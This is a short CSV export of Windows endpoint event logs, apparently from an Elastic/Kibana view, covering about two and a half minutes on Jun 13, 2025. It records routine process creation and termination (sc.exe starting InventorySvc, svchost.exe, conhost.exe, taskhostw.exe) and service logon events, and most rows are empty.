"@timestamp","process.name","process.command_line","network.transport","source.port","dns.type","event.action"
"Jun 13, 2025 @ 21:29:05.207","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:59.908","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:54.616","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:49.327","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:44.042","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:38.757","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:33.474","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:28.189","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:25.271","conhost.exe","-","-","-","-","Process terminated"
"Jun 13, 2025 @ 21:28:25.232","sc.exe","-","-","-","-","Process terminated"
"Jun 13, 2025 @ 21:28:25.222","-","-","-","-","-",None
"Jun 13, 2025 @ 21:28:25.062","svchost.exe","C:\Windows\system32\svchost.exe -k InvSvcGroup -p","-","-","-","Process creation"
"Jun 13, 2025 @ 21:28:25.026","services.exe","-","-","-","-","logged-in"
"Jun 13, 2025 @ 21:28:25.026","-","-","-","-","-","logged-in-special"
"Jun 13, 2025 @ 21:28:24.526","conhost.exe","\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","-","-","-","Process creation"
"Jun 13, 2025 @ 21:28:24.471","sc.exe","""C:\Windows\system32\sc.exe"" start InventorySvc","-","-","-","Process creation"
"Jun 13, 2025 @ 21:28:22.902","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:19.670","taskhostw.exe","-","-","-","-","Process terminated"
"Jun 13, 2025 @ 21:28:19.060","taskhostw.exe","taskhostw.exe SYSTEM","-","-","-","Process creation"
"Jun 13, 2025 @ 21:28:17.617","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:12.318","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:09.269","backgroundTaskHost.exe","""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:Global.DesktopSpotlight.AppXz2j21w56bgxkgsjhtn7zkjsepq96erz2.mca","-","-","-","Process creation"
"Jun 13, 2025 @ 21:28:07.030","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:01.742","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:56.459","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:51.178","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:45.896","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:40.611","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:35.328","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:29.988","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:24.698","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:19.406","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:14.121","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:08.837","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:03.552","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:58.264","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:52.981","-","-","-","-","-","-"
